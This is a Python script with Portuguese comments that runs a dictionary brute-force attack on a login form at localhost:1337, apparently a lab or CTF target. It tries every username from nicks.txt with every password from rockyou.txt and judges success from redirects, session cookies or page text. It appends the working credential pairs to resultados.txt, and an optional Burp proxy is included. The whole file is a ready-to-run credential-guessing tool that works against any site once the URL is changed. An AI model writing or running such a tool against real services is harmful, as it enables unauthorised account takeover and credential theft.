import requests
from pathlib import Path

URL = "http://localhost:1337/login"

# Descomente para interceptar no Burp:
# PROXIES = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080",
# }
PROXIES = None

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://localhost:1337",
    "Referer": "http://localhost:1337/login",
    "Connection": "close",
}

def is_success(response: requests.Response, data: dict) -> bool:
    """
    Detecta sucesso e, se verdadeiro, persiste 'data' em resultados.txt.
    """
    sucesso = False

    if response.status_code in (302, 303, 307, 308):
        sucesso = True
    else:
        set_cookie = response.headers.get("Set-Cookie", "")
        if "session" in set_cookie.lower() or "sess" in set_cookie.lower():
            sucesso = True
        else:
            text = response.text.lower()
            sinais_sucesso = ("bem-vindo", "dashboard", "minha conta")
            sinais_falha = ("credenciais", "inválid", "invalido", "erro", "senha incorreta")
            sucesso = any(s in text for s in sinais_sucesso) and not any(f in text for f in sinais_falha)

    # Se sucesso, grava o par testado em resultados.txt (append)
    if sucesso:
        try:
            with open("resultados.txt", "a", encoding="utf-8") as f:
                f.write(f"username={data.get('username','')}; password={data.get('password','')}\n")
        except Exception as e:
            # Não falhar o fluxo por erro de I/O; apenas logar
            print(f"[!] Erro ao escrever em resultados.txt: {e}")

    return sucesso

def main():
    ARQ_NICKS = Path("nicks.txt")
    ARQ_ROCK  = Path("rockyou.txt")

    if not ARQ_NICKS.exists() or not ARQ_ROCK.exists():
        raise FileNotFoundError("Certifique-se de que 'nicks.txt' e 'rockyou.txt' existem na pasta atual.")

    # Percorre nicks linha a linha
    with ARQ_NICKS.open("r", encoding="utf-8", errors="ignore") as fn:
        for nick_line in fn:
            username = nick_line.rstrip("\r\n")
            if username == "":
                continue  # pula linhas vazias

            # Para cada nick, percorre TODAS as linhas de rockyou, reabrindo o arquivo (memória-friendly)
            with ARQ_ROCK.open("r", encoding="utf-8", errors="ignore") as fr:
                for rock_line in fr:
                    password = rock_line.rstrip("\r\n")
                    if password == "":
                        continue  # pula linhas vazias

                    # Aqui estão as duas variáveis:
                    # usuario -> primeira linha corrente de nicks
                    # senha   -> primeira/segunda/... linha corrente de rockyou

                    data = {"username": username, "password": password}
                    with requests.Session() as s:
                        try:
                            resp = s.post(URL, headers=HEADERS, data=data, proxies=PROXIES, allow_redirects=False, timeout=10)
                        except requests.RequestException as e:
                            print(f"[!] Erro ao enviar requisição: {e}")
                            return

                        print(f"Username: {username!r} | Password: {password!r}")
                        print(f"Status: {resp.status_code}")
                        ok = is_success(resp, data)
                        print("Login teve sucesso" if ok else "Login falhou")

if __name__ == "__main__":
    main()
